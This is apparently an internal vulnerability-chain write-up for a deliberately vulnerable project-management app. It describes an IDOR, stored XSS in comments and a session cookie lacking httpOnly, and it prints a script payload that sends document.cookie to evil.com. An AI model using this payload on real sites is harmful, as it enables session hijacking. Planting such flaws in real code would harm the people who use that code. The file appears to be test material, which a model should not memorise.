# Chained Vulnerability Scenarios — Project Mgmt

## Chain: "Board IDOR → Stored XSS in Task Comments → Session Token Exfiltration"

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | `GET /api/boards/:id` does not verify the requested board belongs to the authenticated user's organization; any logged-in user can read boards and tasks from other organizations | Medium | A01 | `src/index.ts` → `GET /api/boards/:id` |
| 2 | `POST /api/boards/:boardId/tasks/:taskId/comments` stores raw comment HTML without sanitization; the stored content is returned verbatim by the GET comments endpoint and executed by any browser that renders it via `innerHTML` | Medium | A03 | `src/index.ts` → comment POST/GET handlers |
| 3 | Session cookie set without `httpOnly` flag; once XSS executes in a victim's browser, `document.cookie` is readable by JavaScript and can be exfiltrated to an attacker-controlled endpoint | Medium | A07 | `src/index.ts` → login cookie |


**Attack narrative**: The attacker logs into their own account and calls `GET /api/boards/3` (belonging to a different org) using the IDOR to read task IDs. They post a comment `<script>fetch('https://evil.com/?c='+document.cookie)</script>` to a task in that board. When a manager from the victim org views the board and their browser renders the comment via `innerHTML`, the script fires and sends the manager's `session_id` cookie (readable because `httpOnly` is absent) to the attacker. The attacker hijacks the manager session.

**Combined Impact**: Persistent cross-organization stored XSS enabling full session takeover of victim org managers.

---

_This file is for internal reference. Ground truth vulnerability data is maintained in [.vulns](.vulns)._
